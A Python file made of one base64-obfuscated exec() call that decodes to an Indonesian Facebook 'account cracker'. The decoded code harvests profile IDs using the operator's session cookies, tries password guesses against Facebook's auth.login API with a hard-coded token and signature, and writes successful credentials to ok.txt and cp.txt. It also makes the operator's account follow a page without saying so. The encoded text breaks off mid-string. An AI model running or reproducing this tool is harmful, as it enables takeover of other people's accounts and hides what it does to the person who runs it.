import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCg0KDQojIENvZGUgYnkgRnV5NGQgTjFsb3kNCiMgQ3JlYXRlZCAwNS0wMy0yMDIyDQojIE15IGZhY2Vib29rIChodHRwczovL20uZmFjZWJvb2suY29tL3BnL0N5YmVyLlBPbGljZS4wMDAwMSkNCg0KaW1wb3J0IG9zLCBzeXMsIHJlLCB0aW1lLCBqc29uLCByYW5kb20sIHJlcXVlc3RzDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3INCg0KDQpkZWYgY3Jvb3QoKToNCiAgICBvcy5zeXN0ZW0oImdpdCBwdWxsIikNCg0KDQpkZWYgaWtlaF9pa2VoX2tpbW9jaGkoKToNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCg0KDQpkZWYgYWFoaChzKToNCiAgICBmb3IgYyBpbiBzICsgJ1xuJzoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgxLiAvIDMwMCkNCg0KDQpkZWYga29udG9sKCk6DQogICAgdGltZS5zbGVlcCgwLjMpDQogICAgYWFoaCgiIiJcblx4MWJbMTs5MW0gICAgICDilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcg4paI4paI4pWXICDilojilojilZcg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZcNCiAgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZEg4paI4paI4pWU4pWdDQogICAgIOKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilojilojilojilZTilZ0gDQpceDFiWzE7OTdtICAgICDilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4paI4paI4pWXIA0KICAgICDilZrilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAg4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZcNClx4MWJbMTs5MW0gIOKAolx4MWJbMTs5M23igKJceDFiWzE7OTJt4oCiXHgxYlsxOzk3bSDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSAgICAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdXHgxYlsxOzkybSDigKJceDFiWzE7OTNt4oCiXHgxYlsxOzkxbeKAog0KXHgxYlsxOzk0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KXHgxYlsxOzk3bSBbXHgxYlsxOzk0beKAolx4MWJbMTs5Mm3igKJceDFiWzE7OTdtXSBBdXRob3IgICA6IEZVWTREIE4xTDBZDQpceDFiWzE7OTdtIFtceDFiWzE7OTJt4oCiXHgxYlsxOzk0beKAolx4MWJbMTs5N21dIEdpdGh1YiAgIDogaHR0cHM6Ly9naXRodWIuY29tL1VuaXF1ZWJyb3RoZXINClx4MWJbMTs5N20gW1x4MWJbMTs5NG3igKJceDFiWzE7OTJt4oCiXHgxYlsxOzk3bV0gRmFjZWJvb2sgOiBodHRwczovL20uZmFjZWJvb2suY29tL3BnL0N5YmVyLlBPbGljZS4wMDAwMQ0KXHgxYlsxOzk0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgCIiIikNCg0KDQpkZWYgamVtYnV0KCk6DQogICAgcHJpbnQoIiIiXG5ceDFiWzE7OTFtICAgICAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWXDQogICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRIOKWiOKWiOKVlOKVnQ0KICAgICDilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWU4pWdIA0KXHgxYlsxOzk3bSAgICAg4paI4paI4pWRICAgICDilojilojilZTilZDilZDilojilojilZfilZrilZDilZDilZDilZDilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKWiOKWiOKVlyANCiAgICAg4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZEgICAgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWXDQpceDFiWzE7OTFtICDigKJceDFiWzE7OTNt4oCiXHgxYlsxOzkybeKAolx4MWJbMTs5N20g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnVx4MWJbMTs5Mm0g4oCiXHgxYlsxOzkzbeKAolx4MWJbMTs5MW3igKINClx4MWJbMTs5NG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANClx4MWJbMTs5N20gW1x4MWJbMTs5Mm0rXHgxYlsxOzk3bV0gQXV0aG9yICAgOiBGVVk0RCBOMUwwWQ0KXHgxYlsxOzk3bSBbXHgxYlsxOzkybStceDFiWzE7OTdtXSBHaXRodWIgICA6IGh0dHBzOi8vZ2l0aHViLmNvbS9VbmlxdWVicm90aGVyDQpceDFiWzE7OTdtIFtceDFiWzE7OTJtK1x4MWJbMTs5N21dIEZhY2Vib29rIDogaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9wZy9DeWJlci5QT2xpY2UuMDAwMDENClx4MWJbMTs5NG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAiIiIpDQoNCg0KZGVmIHlheWFueGQoKToNCiAgICB5YXlhbiA9IGlucHV0KCJcblwwMzNbMDBtXHQgICBbXDAzM1s5Nm0gUHJlc3MgRW50ZXIgVG8gUmV0dXJuXDAzM1s5N20gXSAiKQ0KICAgIGlmIHlheWFuID09ICIiOg0KICAgICAgICBvcy5zeXN0ZW0oInB5dGhvbiBiYmMucHkiKQ0KICAgIGVsc2U6DQogICAgICAgIHN5cy5leGl0KCJcblwwMzNbMTs5N20gW1wwMzNbMTs5MW3igKJcMDMzWzE7OTdtXSBcMDMzWzE7OTFtR29vZCBCeWVlIDonKSIpDQoNCg0KZGVmIG1vY2hfeWF5YW4oKToNCiAgICB0aW1lLnNsZWVwKDAuMSkNCiAgICBwcmludCgiXDAzM1s5N20gW1wwMzNbOTZtMDFcMDMzWzk3bV0gU3RhcnQgIENyNGNrIElEIikNCiAgICBwcmludCgiXDAzM1s5N20gW1wwMzNbOTZtMDJcMDMzWzk3bV0gVHV0b3IgIEhvdyB0byBHZXQgRmIgQ29va2llcyIpDQogICAgcHJpbnQoIlwwMzNbOTdtIFtcMDMzWzk2bTAzXDAzM1s5N21dIEpvaW5lZCBHcnVwIEZiIOKdpO+4jyBSQVRVIEVSUk9SIOKdpO+4jyIpDQogICAgcHJpbnQoIlwwMzNbOTdtIFtcMDMzWzk2bTA0XDAzM1s5N21dIEpvaW5lZCBHcnVwIEZiIFZpcmFsIikNCiAgICBwcmludCgiXDAzM1s5N20gW1wwMzNbOTZtMDVcMDMzWzk3bV0gVXBkYXRlIFRvb2xzIikNCiAgICBwcmludCgiXDAzM1s5N20gW1wwMzNbOTFtMDBcMDMzWzk3bV0gRXhpdCIpDQogICAgcHJpbnQoIlx4MWJbMTs5NG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAiKQ0KICAgIHRpbWUuc2xlZXAoMC4xKQ0KDQogICAgeWF5YW4gPSBpbnB1dCgiXHgxYlsxOzk3bSBbXHgxYlsxOzk0beKAolx4MWJbMTs5MW3igKJceDFiWzE7OTdtXSBcMDMzWzkwbeKWulwwMzNbMTs5M20gIikNCiAgICBpZiB5YXlhbiA9PSAiMSIgb3IgeWF5YW4gPT0gIjAxIjoNCiAgICAgICAgbWJhc2ljID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbXt9Jw0KICAgICAgICBnbG9iYWwgZGllLCBjaGVjaywgcmVzdWx0LCBjb3VudA0KICAgICAgICBpZCA9IFtdDQogICAgICAgIGRpZSA9IDANCiAgICAgICAgY2hlayA9IFtdDQogICAgICAgIGhhY2sgPSBbXQ0KICAgICAgICBjb3VudCA9IDANCiAgICAgICAgY2hlY2sgPSAwDQogICAgICAgIHJlc3VsdCA9IDANCg0KICAgICAgICBkZWYgbWFzdWsoKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCJjb29raWVzIikucmVhZCgpDQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgICAgICAgICAgaWtlaF9pa2VoX2tpbW9jaGkoKQ0KICAgICAgICAgICAgICAgIGtvbnRvbCgpDQogICAgICAgICAgICAgICAgY2VrID0gaW5wdXQoDQogICAgICAgICAgICAgICAgICAgICJcblwwMzNbMDs5Mm0gICAgICAgWyBcMDMzWzA7OTdtVGhpcyBUb29sIFVzZSBGYWNlYm9vayBDb29raWVzIFwwMzNbMDs5Mm1dXG5cblwwMzNbOTdtIFtcMDMzWzkxbT9cMDMzWzk3bV0gQ29va2llcyBcMDMzWzE7OTFtOiBcMDMzWzE7OTZtIikNCiAgICAgICAgICAgICAgICBwcmludCgnXG5cMDMzWzk3bSBbXDAzM1s5Mm0rXDAzM1s5N21dIFwwMzNbOTJtUGxlYXMgV2FpdC4uLicpDQogICAgICAgICAgICBjZWsgPSB7ImNvb2tpZSI6IGNla30NCiAgICAgICAgICAgIGlzbWkgPSBzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoIi9tZSIsIHZlcmlmeT1GYWxzZSksIGNvb2tpZXM9Y2VrKS5jb250ZW50DQogICAgICAgICAgICBpZiAibWJhc2ljX2xvZ291dF9idXR0b24iIGluIHN0cihpc21pKToNCiAgICAgICAgICAgICAgICBpZiAiQXBhIHlhbmcgQW5kYSBwaWtpcmthbiBzZWthcmFuZyIgaW4gc3RyKGlzbWkpOg0KICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oImNvb2tpZXMiLCAidyIpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKGNla1siY29va2llIl0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5N21bXDAzM1sxOzk0beKAolwwMzNbMTs5N21dIFwwMzNbMDBtVWJhaCBiYWhhc2EsIGhhcmFwIHR1bmdndVwwMzNbMTs5MW0hIVwwMzNbMDBtIikNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1iYXNpYy5mb3JtYXQocGFyc2VyKGlzbWksICJodG1sLnBhcnNlciIpLmZpbmQoImEiLCBzdHJpbmc9IkJhaGFzYSBJbmRvbmVzaWEiKVsiaHJlZiJdKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzPWNlaykNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgaWt1dGkgPSBcDQogICAgICAgICAgICAgICAgICAgIHBhcnNlcihyZXF1ZXN0cy5nZXQobWJhc2ljLmZvcm1hdCgiL0tNMzk0NTMiKSwgY29va2llcz1jZWspLmNvbnRlbnQsICJodG1sLnBhcnNlciIpLmZpbmQoImEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZz0iSWt1dGkiKVsNCiAgICAgICAgICAgICAgICAgICAgICAgICJocmVmIl0NCiAgICAgICAgICAgICAgICAgICAgc2VzLmdldChtYmFzaWMuZm9ybWF0KGlrdXRpKSwgY29va2llcz1jZWspDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgcmV0dXJuIGNla1siY29va2llIl0NCiAgICAgICAgICAgICAgICBhYWhoKCdcMDMzWzE7OTdtW1wwMzNbMTs5NG3iiJpcMDMzWzE7OTdtXSBcMDMzWzE7OTJtTG9naW4gU3VjY2Vzc2Z1bGx5JykNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL20uZmFjZWJvb2suY29tL3BnL0N5YmVyLlBPbGljZS4wMDAwMSIpDQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgY29va2llcycpDQogICAgICAgICAgICAgICAgcHJpbnQoIiBcbiBceDFiWzE7OTdtW1x4MWJbMTs5MW0hXHgxYlsxOzk3bV0gQ29va2llcyBFcnJvciIpDQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdweXRob24gQ3I0Y2sucHknKQ0KDQogICAgICAgIGRlZiBsb2dpbih1c2VybmFtZSwgcGFzc3dvcmQsIGNlaz1GYWxzZSk6DQogICAgICAgICAgICBnbG9iYWwgZGllLCBjaGVjaywgcmVzdWx0LCBjb3VudA0KICAgICAgICAgICAgYiA9ICIzNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMiINCiAgICAgICAgICAgIHBhcmFtcyA9IHsNCiAgICAgICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYiwNCiAgICAgICAgICAgICAgICAnZm9ybWF0JzogJ0pTT04nLA0KICAgICAgICAgICAgICAgICdzZGtfdmVyc2lvbic6ICcyJywNCiAgICAgICAgICAgICAgICAnZW1haWwnOiB1c2VybmFtZSwNCiAgICAgICAgICAgICAgICAnbG9jYWxlJzogJ2VuX1VTJywNCiAgICAgICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwNCiAgICAgICAgICAgICAgICAnc2RrJzogJ2lvcycsDQogICAgICAgICAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywNCiAgICAgICAgICAgICAgICAnc2lnJzogJzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JywNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGFwaSA9ICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbicNCiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGFwaSwgcGFyYW1zPXBhcmFtcykNCiAgICAgICAgICAgIGlmICdFQUEnIGluIHJlc3BvbnNlLnRleHQ6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJcclwwMzNbMTs5Mm0gICogLS0+IHt1c2VybmFtZX18e3Bhc3N3b3JkfSAgICAgICAgICAgICAgICAgICAgICAgIiwgZW5kPSIiKQ0KICAgICAgICAgICAgICAgIHByaW50KCkNCiAgICAgICAgICAgICAgICByZXN1bHQgKz0gMQ0KICAgICAgICAgICAgICAgIGlmIGNlazoNCiAgICAgICAgICAgICAgICAgICAgbGlmZS5hcHBlbmQodXNlcm5hbWUgKyAifCIgKyBwYXNzd29yZCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ29rLnR4dCcsICdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiByZXNwb25zZS5qc29uKClbJ2Vycm9yX21zZyddOg0KICAgICAgICAgICAgICAgIHByaW50KGYiXHJcMDMzWzE7OTNtICAqIC0tPiB7dXNlcm5hbWV9fHtwYXNzd29yZH0gICAgICAgICAgICAgICAgICAgICIsIGVuZD0iIikNCiAgICAgICAgICAgICAgICBwcmludCgpDQogICAgICAgICAgICAgICAgY2hlY2sgKz0gMQ0KICAgICAgICAgICAgICAgIGlmIGNlazoNCiAgICAgICAgICAgICAgICAgICAgY2hlay5hcHBlbmQodXNlcm5hbWUgKyAifCIgKyBwYXNzd29yZCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ2NwLnR4dCcsICdhJykgYXMgZjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUodXNlcm5hbWUgKyAnfCcgKyBwYXNzd29yZCArICdcbicpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGRpZSArPSAxDQogICAgICAgICAgICBmb3IgaSBpbiBsaXN0KCdcfC8t4oCiJyk6DQogICAgICAgICAgICAgICAgcHJpbnQoDQogICAgICAgICAgICAgICAgICAgIGYiXHJcMDMzWzAwbSBbXDAzM1sxOzkxbXtpfVwwMzNbMDBtXSBvayA6IFwwMzNbOTBtKFwwMzNbMTs5Mm17c3RyKHJlc3VsdCl9XDAzM1s5MG0pIFwwMzNbMDBtY3AgOiBcMDMzWzkwbShcMDMzWzE7OTNte3N0cihjaGVjayl9XDAzM1s5MG0pIFwwMzNbMDBtZGllIDogXDAzM1s5MG0oXDAzM1sxOzk0bXtzdHIoZGllKX1cMDMzWzkwbSlcMDMzWzAwbSIsDQogICAgICAgICAgICAgICAgICAgIGVuZD0iIikNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMikNCg0KICAgICAgICBkZWYgZ2V0aWQodXJsKToNCiAgICAgICAgICAgIHJhdyA9IHJlcXVlc3RzLmdldCh1cmwsIGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICAgICAgZ2V0dXNlciA9IHJlLmZpbmRhbGwoJ21pZGRsZSI+PGEgY2xhc3M9Ii4uIiBocmVmPSIoLio/KSI+KC4qPyk8L2E+Jywgc3RyKHJhdykpDQogICAgICAgICAgICBmb3IgeCBpbiBnZXR1c2VyOg0KICAgICAgICAgICAgICAgIGlmICdwcm9maWxlJyBpbiB4WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQoeFsxXSArICd8JyArIHJlLmZpbmRhbGwoIj0oXGQqKT8iLCBzdHIoeFswXSkpWzBdKQ0KICAgICAgICAgICAgICAgIGVsaWYgJ2ZyaWVuZHMnIGluIHg6DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHhbMV0gKyAnfCcgKyB4WzBdLnNwbGl0KCcvJylbMV0uc3BsaXQoJz8nKVswXSkNCiAgICAgICAgICAgICAgICBwcmludCgnXHJcMDMzWzE7OTdtIFtcMDMzWzE7OTRt4oCiXDAzM1sxOzk3bV0gXDAzM1sxOzk2bScgKyBzdHIoDQogICAgICAgICAgICAgICAgICAgIGxlbihpZCkpICsgIiBcMDMzWzE7OTdtUHJvY2VzcyBPZiBSZXRyaWV2aW5nIElELi4uICIsIGVuZD0iIikNCiAgICAgICAgICAgIGlmICdMaWhhdCBUZW1hbiBMYWluJyBpbiBzdHIocmF3KToNCiAgICAgICAgICAgICAgICBnZXRpZChtYmFzaWMuZm9ybWF0KHBhcnNlcihyYXcsICdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLCBzdHJpbmc9J0xpaGF0IFRlbWFuIExhaW4nKVsnaHJlZiddKSkNCiAgICAgICAgICAgIHJldHVybiBpZA0KDQogICAgICAgIGRlZiBmcm9tbGlrZXModXJsKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBsaWtlID0gcmVxdWVzdHMuZ2V0KHVybCwgY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgICAgICAgICAgbG92ZSA9IHJlLmZpbmRhbGwoJ2hyZWY9IigvdWZpLio/KSInLCBzdHIobGlrZSkpWzBdDQogICAgICAgICAgICAgICAgYXdzID0gZ2V0bGlrZShtYmFzaWMuZm9ybWF0KGxvdmUpKQ0KICAgICAgICAgICAgICAgIHJldHVybiBhd3MNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICBleGl0KCIgXDAzM1sxOzk3bSBbXDAzM1sxOzk0beKAolwwMzNbMTs5N21dIExpbmsgTm90IEZvdW5kISIpDQoNCiAgICAgICAgZGVmIGdldGxpa2UocmVhY3QpOg0KICAgICAgICAgICAgbGlrZSA9IHJlcXVlc3RzLmdldChyZWFjdCwgY29va2llcz1rdWtpKS5jb250ZW50DQogICAgICAgICAgICBpZHMgPSByZS5maW5kYWxsKCdjbGFzcz0iYi4iPjxhIGhyZWY9IiguKj8pIj4oLio/KTwvYT48L2gzPicsIHN0cihsaWtlKSkNCiAgICAgICAgICAgIGZvciB1c2VyIGluIGlkczoNCiAgICAgICAgICAgICAgICBpZiAncHJvZmlsZScgaW4gdXNlclswXToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCI9KFxkKikiLCBzdHIodXNlclswXSkpWzBdKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGlkLmFwcGVuZCh1c2VyWzFdICsgInwiICsgdXNlclswXS5zcGxpdCgnLycpWzFdKQ0KICAgICAgICAgICAgICAgIHByaW50KA0KICAgICAgICAgICAgICAgICAgICBmJ1xyXDAzM1sxOzk3bSBbXDAzM1sxOzk0beKAolwwMzNbMTs5N21dIFwwMzNbMTs5Nm17c3RyKGxlbihpZCkpfSBcMDMzWzE7OTdtUHJvY2VzcyBPZiBSZXRyaWV2aW5nIElELi4uICcsDQogICAgICAgICAgICAgICAgICAgIGVuZD0iIikNCiAgICAgICAgICAgIGlmICdMaWhhdCBTZWxlbmdrYXBueWEnIGluIHN0cihsaWtlKToNCiAgICAgICAgICAgICAgICBnZXRsaWtlKG1iYXNpYy5mb3JtYXQocGFyc2VyKGxpa2UsICdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLCBzdHJpbmc9IkxpaGF0IFNlbGVuZ2thcG55YSIpWyJocmVmIl0pKQ0KICAgICAgICAgICAgcmV0dXJuIGlkDQoNCiAgICAgICAgZGVmIGJ5c2VhcmNoKG9wdGlvbik6DQogICAgICAgICAgICBzZWFyY2ggPSByZXF1ZXN0cy5nZXQob3B0aW9uLCBjb29raWVzPWt1a2kpLmNvbnRlbnQNCiAgICAgICAgICAgIHVzZXJzID0gcmUuZmluZGFsbCgnY2xhc3M9InggY2giPjxhIGhyZWY9Ii8oLio/KSI+PGRpdi4qP2NsYXNzPSJjaiI+KC4qPyk8L2Rpdj4nLCBzdHIoc2VhcmNoKSkNCiAgICAgICAgICAgIGZvciB1c2VyIGluIHVzZXJzOg0KICAgICAgICAgICAgICAgIGlmICJwcm9maWxlIiBpbiB1c2VyWzBdOg0KICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQodXNlclsxXSArICJ8IiArIHJlLmZpbmRhbGwoIj0oXGQqKSIsIHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdLnNwbGl0KCI/IilbMF0pDQogICAgICAgICAgICAgICAgcHJpbnQoDQogICAgICAgICAgICAgICAgICAgIGYiXHJcMDMzWzE7OTdtIFtcMDMzWzE7OTRt4oCiXDAzM1sxOzk3bV0gXDAzM1sxOzk2bXtzdHIobGVuKGlkKSl9IFwwMzNbMTs5N21Qcm9jZXNzIE9mIFJldHJpZXZpbmcgSUQuLi4gIiwNCiAgICAgICAgICAgICAgICAgICAgZW5kPSIiKQ0KICAgICAgICAgICAgaWYgIkxpaGF0IEhhc2lsIFNlbGFuanV0bnlhIiBpbiBzdHIoc2VhcmNoKToNCiAgICAgICAgICAgICAgICBieXNlYXJjaChwYXJzZXIoc2VhcmNoLCAnaHRtbC5wYXJzZXInKS5maW5kKCJhIiwgc3RyaW5nPSJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIpWyJocmVmIl0pDQogICAgICAgICAgICByZXR1cm4gaWQNCg0KICAgICAgICBkZWYgZ3J1YmlkKGVuZHBvaW50KToNCiAgICAgICAgICAgIGdyYWIgPSByZXF1ZXN0cy5nZXQoZW5kcG9pbnQsIGNvb2tpZXM9a3VraSkuY29udGVudA0KICAgICAgICAgICAgdXNlcnMgPSByZS5maW5kYWxsKCdhIGNsYXNzPSIuLiIgaHJlZj0iLyguKj8pIj4oLio/KTwvYT4nLCBzdHIoZ3JhYikpDQogICAgICAgICAgICBmb3IgdXNlciBpbiB1c2VyczoNCiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZSIgaW4gdXNlclswXToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyByZS5maW5kYWxsKCdpZD0oXGQqKScsIHN0cih1c2VyWzBdKSlbMF0pDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKHVzZXJbMV0gKyAifCIgKyB1c2VyWzBdKQ0KICAgICAgICAgICAgICAgIHByaW50KA0KICAgICAgICAgICAgICAgICAgICBmIlxyXDAzM1sxOzk3bSBbXDAzM1sxOzk0beKAolwwMzNbMTs5N21dIFwwMzNbMTs5Nm17c3RyKGxlbihpZCkpfSBcMDMzWzE7OTdtUHJvY2VzcyBPZiBSZXRyaWV2aW5nIElELi4uICIsDQogICAgICAgICAgICAgICAgICAgIGVuZD0iIikNCiAgICAgICAgICAgIGlmICJMaWhhdCBTZWxlbmdrYXBueWEiIGluIHN0cihncmFiKToNCiAgICAgICAgICAgICAgICBncnViaWQobWJhc2ljLmZvcm1hdChwYXJzZXIoZ3JhYiwgImh0bWwucGFyc2VyIikuZmluZCgiYSIsIHN0cmluZz0iTGloYXQgU2VsZW5na2FwbnlhIilbImhyZWYiXSkpDQogICAgICAgICAgICByZXR1cm4gaWQNCg0KICAgICAgICBpZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgICAgIGt1a2lzID0gbWFzdWsoKQ0KICAgICAgICAgICAgICAgIGt1a2kgPSB7J2Nvb2tpZSc6IGt1a2lzfQ0KICAgICAgICAgICAgICAgIGlrZWhfaWtlaF9raW1vY2hpKCkNCiAgICAgICAgICAgICAgICBrb250b2woKQ0KICAgICAgICAgICAgICAgIGFhaGgoJ1wwMzNbMTs5N20gW1wwMzNbMTs5Mm0wMVwwMzNbMTs5N21dIENyYWNrIEZyb20gSUQgRnJpZW5kJykNCiAgICAgICAgICAgICAgICBhYWhoKCdcMDMzWzE7OTdtIFtcMDMzWzE7OTJtMDJcMDMzWzE7OTdtXSBDcmFjayBGcm9tIE